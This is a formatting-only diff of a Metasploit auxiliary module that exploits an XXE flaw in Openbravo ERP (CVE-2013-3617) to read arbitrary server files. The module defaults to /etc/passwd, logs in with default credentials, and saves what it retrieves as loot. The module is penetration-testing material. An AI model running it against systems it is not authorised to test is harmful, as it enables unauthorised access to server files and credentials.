@@ -11,29 +11,30 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name' => 'Openbravo ERP XXE Arbitrary File Read',
-      'Description' => %q{
-        The Openbravo ERP XML API expands external entities which can be defined as
-        local files. This allows the user to read any files from the FS as the
-        user Openbravo is running as (generally not root).
+    super(
+      update_info(
+        info,
+        'Name' => 'Openbravo ERP XXE Arbitrary File Read',
+        'Description' => %q{
+          The Openbravo ERP XML API expands external entities which can be defined as
+          local files. This allows the user to read any files from the FS as the
+          user Openbravo is running as (generally not root).
 
-        This module was tested against Openbravo ERP version 3.0MP25 and 2.50MP6.
-      },
-      'Author' =>
-        [
+          This module was tested against Openbravo ERP version 3.0MP25 and 2.50MP6.
+        },
+        'Author' => [
           'Brandon Perry <bperry.volatile[at]gmail.com>' # Discovery / msf module
         ],
-      'References' =>
-        [
+        'References' => [
           ['CVE', '2013-3617'],
           ['OSVDB', '99141'],
           ['BID', '63431'],
           ['URL', 'https://blog.rapid7.com/2013/10/30/seven-tricks-and-treats']
         ],
-      'License' => MSF_LICENSE,
-      'DisclosureDate' => '2013-10-30'
-    ))
+        'License' => MSF_LICENSE,
+        'DisclosureDate' => '2013-10-30'
+      )
+    )
 
     register_options(
       [
@@ -42,7 +43,8 @@ class MetasploitModule < Msf::Auxiliary
         OptString.new('HttpPassword', [true, "The Openbravo password", "openbravo"]),
         OptString.new('FILEPATH', [true, "The filepath to read on the server", "/etc/passwd"]),
         OptString.new('ENDPOINT', [true, "The XML API REST endpoint to use", "ADUser"])
-      ])
+      ]
+    )
   end
 
   def run
@@ -57,7 +59,7 @@ class MetasploitModule < Msf::Auxiliary
       fail_with(Failure::NoAccess, "Invalid response. Check your credentials and that the server is correct.")
     end
 
-    xml = path = id = other_id = ''  #for later use
+    xml = path = id = other_id = ''  # for later use
     doc = REXML::Document.new users.body
 
     doc.root.elements.each do |user|
@@ -100,7 +102,7 @@ class MetasploitModule < Msf::Auxiliary
       })
 
       u = REXML::Document.new u.body
-      path = store_loot('openbravo.file','text/plain/', datastore['RHOST'], u.root.elements["//comments"].first.to_s, "File from Openbravo server #{datastore['RHOST']}")
+      path = store_loot('openbravo.file', 'text/plain/', datastore['RHOST'], u.root.elements["//comments"].first.to_s, "File from Openbravo server #{datastore['RHOST']}")
       break
     end
 
@@ -112,8 +114,8 @@ class MetasploitModule < Msf::Auxiliary
       send_request_raw({
         'method' => 'PUT',
         'uri' => normalize_uri(target_uri.path, "/ws/dal/#{datastore["ENDPOINT"]}/#{id}"),
-      'data' => xml,
-      'authorization' => basic_auth(datastore['HttpUsername'], datastore['HttpPassword'])
+        'data' => xml,
+        'authorization' => basic_auth(datastore['HttpUsername'], datastore['HttpPassword'])
       })
 
       print_good("File saved to: #{path}")
